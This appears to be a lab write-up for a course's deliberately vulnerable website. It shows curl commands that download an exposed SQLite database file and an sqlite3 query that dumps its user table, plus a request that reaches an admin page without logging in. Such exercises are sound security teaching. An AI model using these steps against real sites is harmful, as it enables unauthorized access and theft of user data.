# Vulnerable Website: Broken Access Control

To exploit the Broken Access Control vulnerability in the vulnerable website, follow these steps:

## Access to Database Directory

1. The directory structure of the vulnerable website is as follows:

    ```bash
    ├── db
    │ └── db.sql
    ├── control.php
    ├── css.css
    ├── dbconn.php
    ├── index.php
    ├── jquery-2.2.4.min.js
    └── js.js
    ```


2. Perform the following command to obtain the database file:

    ```bash
    curl http://10.10.1.231:51130/__db__/db.sql --output db.sql
    ```

    This command downloads the `db.sql` file from the `__db__` directory.

3. Once the db.sql file is obtained, execute the following command to print the content of the database:

    ```sql
    sqlite3 db.sql "SELECT * FROM user"
    ```

    This command uses SQLite to query and retrieve the data from the user table within the obtained database file.

<div align="center">
        <img src="https://github.com/BenIlies/CS394X/raw/main/Vulnerable-Website/Attacks/Broken-Access-Control/database-dumping.PNG" alt="Database Dumping">
</div>

## Lack of Session Management

1. In addition to the access to the database directory, there is a lack of Session Management for accessing the `control.php` page. This means that even without authenticating, a malicious user can still access the page.

    To highlight this, execute the following command (or perform the action in a web browser):

    ```bash
    curl http://10.10.1.231:51130/control.php
    ```

    This command accesses the `control.php` page without authentication, demonstrating the lack of proper session management. It allows unauthorized access to the web page.

    **Note:** Tools like DirBuster can be used to discover hidden files or directories, but they are not specifically related to this vulnerability.